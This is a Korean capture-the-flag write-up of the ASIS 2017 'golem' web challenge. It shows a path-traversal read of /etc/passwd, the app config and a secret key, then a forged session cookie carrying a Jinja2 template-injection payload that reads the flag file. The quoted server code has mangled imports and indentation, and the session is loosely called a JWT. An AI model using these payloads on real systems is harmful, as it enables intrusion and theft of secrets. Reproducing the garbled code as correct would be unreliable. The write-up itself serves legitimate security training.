# [WEB] ASIS 2017 FINAL - golem

# Description
Golem is an animated anthropomorphic being that is magically created entirely from inanimate matter, but Golem is stupid!

# Analysis
golem의 이름을 입력하면 특성 게시물을 읽을거 같은 URL로 변경된다.
`https://golem.asisctf.com/article?name=`
name값을 ../../../../../etc/passwd를 입력해보니 LFI가 발생하였다.
이용 이용하여 무언가를 하는 문제인가보다.

# Exploit
1. LFI
2. Template injection using JWT


## 1. LFI

`https://golem.asisctf.com/article?name=[path]`
path부분에 파일의 상대 경로를 통해 LFI가 가능하다.

/proc/self/cmdline을 읽으면 
```
/usr/bin/uwsgi--ini/usr/share/uwsgi/conf/default.ini--ini/etc/uwsgi/apps-enabled/golem_proj.ini--daemonize/var/log/uwsgi/app/golem_proj.log
```
같이 명령이 실행된 것을 알 수 있다.

/etc/uwsgi/apps-enabled/golem_proj.ini을 읽어보자.
```
#/etc/uwsgi/apps-enabled/golem_proj.ini
[uwsgi]
socket		= 127.0.0.1:9090
plugin		= python
wsgi-file	= /opt/serverPython/golem/server.py
chdir           = /opt/serverPython/golem
process		= 3
callable	= app
```
`/opt/serverPython/golem/server.py`가 서버 파일이므로 읽어보자.
```python
#/opt/serverPython/golem/server.py
#!/usr/bin/python
import os from flask
import ( Flask, render_template, request, url_for, redirect, session, render_template_string ) from flask.ext.session
import Session
app = Flask(__name__)
execfile('flag.py')
execfile('key.py')
FLAG = flag
app.secret_key = key
@app.route("/golem", methods=["GET", "POST"])
def golem():
	if request.method != "POST":
		return redirect(url_for("index"))

		golem = request.form.get("golem") or None
		if golem is not None:
			golem = golem.replace(".", "").replace("_", "").replace("{","").replace("}","")
		if "golem" not in session or session['golem'] is None:
			session['golem'] = golem
			template = None
		if session['golem'] is not None:
			template = '''{%% extends "layout.html" %%} {%% block body %%} <h1>Golem Name</h1> <div class="row> <div class="col-md-6 col-md-offset-3 center"> Hello : %s, why you don't look at our <a href='/article?name=article'>article</a>? </div> </div> {%% endblock %%} ''' % session['golem']

			print
			session['golem'] = None

		return render_template_string(template)

@app.route("/", methods=["GET"])
def index():
	return render_template("main.html")

@app.route('/article', methods=['GET'])
def article():
	error = 0
	if 'name' in request.args:
		page = request.args.get('name')
	else:
		page = 'article'
	if page.find('flag')>=0:
		page = 'notallowed.txt'
	try:
		template = open('/home/golem/articles/{}'.format(page)).read()
	except Exception as e:
		template = e
	return render_template('article.html', template=template)

if __name__ == "__main__":
	app.run(host='0.0.0.0', debug=False)
```
flask 기반의 웹 서버이다.
flag.py는 이 취약점을 이용해 읽을 수 없다.(article함수 참고)
여기서 golem()함수를 보면 session에 golem이 존재하면 request로 받는 값으로 덮어쓰지 않고 session값으로 처리를 한다.
session은 JWT을 사용하고 있다.
또한 render_temaplte_string을 사용하므로 template injection이 가능하다.
참고로 request 값으로 template injection을 하면 필터링이 적용되므로 불가능하다.


## 2. Template injection using JWT

session값을 보면 `eyJnb2xlbSI6bnVsbH0.DJUDyQ.hH1zXB8kKo1cdHfb57xT6jnrimA`이다.
이는 JWT Token으로써 decode하면 `{"golem":null}`의 값을 가지고 있다.

위의 LFI를 이용해 app.secret_key를 얻을 수 있다.
```python
/opt/serverPython/golem/key.py
key = '7h15_5h0uld_b3_r34lly_53cur3d'
```
secret_key를 이용하여 template injection을 수행하면 flag를 얻을 수 있다.

> Query : '{"golem":"{{[].__class__.__base__.__subclasses__()\[40\](\"/opt/serverPython/golem/flag.py\").read()}}"}'
> 
> JWT : .eJyrVkrPz0nNVbKqVlJIUrJSSjUuSYoINk2LMPIr
jozwq4owtCiNMLTMBLJzoOyqlHCvrCR3t6pkozCQfL53WLGBr5tBvme
mZVmyR2AZULwyJTesMtQjxyDR3bLUxyilLMk9rMTHKKo4Mjy5NNkjO9
M72LQyKtwt29s5xzIt0NZWqbYWAFZnLfU.DJVHlQ.2PwHmlFVhfpcB6
Z0Iya8pAYsAm8


**ASIS{I_l0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!}**
